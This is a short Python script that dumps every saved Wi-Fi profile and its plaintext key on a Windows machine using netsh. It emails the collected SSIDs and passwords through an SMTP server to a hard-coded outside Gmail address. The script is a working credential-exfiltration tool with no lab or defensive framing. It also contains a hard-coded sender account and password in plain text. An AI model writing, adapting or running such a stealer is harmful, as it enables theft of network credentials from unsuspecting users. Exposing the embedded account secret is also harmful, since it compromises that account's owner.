import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def get_wifi_credentials():
    # Get the list of all saved Wi-Fi profiles
    command = "netsh wlan show profiles"
    profiles = subprocess.check_output(command, shell=True, encoding='utf-8')

    wifi_info = []
    
    # Extract SSID and Key from each profile
    for line in profiles.splitlines():
        if "All User Profile" in line:
            ssid = line.split(":")[1].strip()
            try:
                # Try to extract the password (Key) if it's available
                command = f"netsh wlan show profile name=\"{ssid}\" key=clear"
                profile_info = subprocess.check_output(command, shell=True, encoding='utf-8')
                for profile_line in profile_info.splitlines():
                    if "Key Content" in profile_line:
                        key = profile_line.split(":")[1].strip()
                        wifi_info.append((ssid, key))
                        break
            except subprocess.CalledProcessError:
                # If no key is found, append SSID with a message
                wifi_info.append((ssid, "No password set"))
    
    return wifi_info

def send_email(wifi_info, sender_email, sender_password, recipient_email):
    # Prepare the email
    subject = "Wi-Fi Credentials"
    body = "Here are the saved Wi-Fi credentials:\n\n"

    for ssid, key in wifi_info:
        body += f"SSID: {ssid}, Password: {key}\n"
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Send the email
    try:
        with smtplib.SMTP('smtp.seznam.cz', 587) as server:
            server.starttls()  # Encrypt the connection
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

if __name__ == "__main__":
    # Retrieve saved Wi-Fi credentials
    wifi_info = get_wifi_credentials()

    # Email details
    sender_email = "info@infopeklo.cz"
    sender_password = "Polik789"  # Use App password if two-factor authentication is enabled
    recipient_email = "alfikeita@gmail.com"

    # Send the Wi-Fi information
    send_email(wifi_info, sender_email, sender_password, recipient_email)
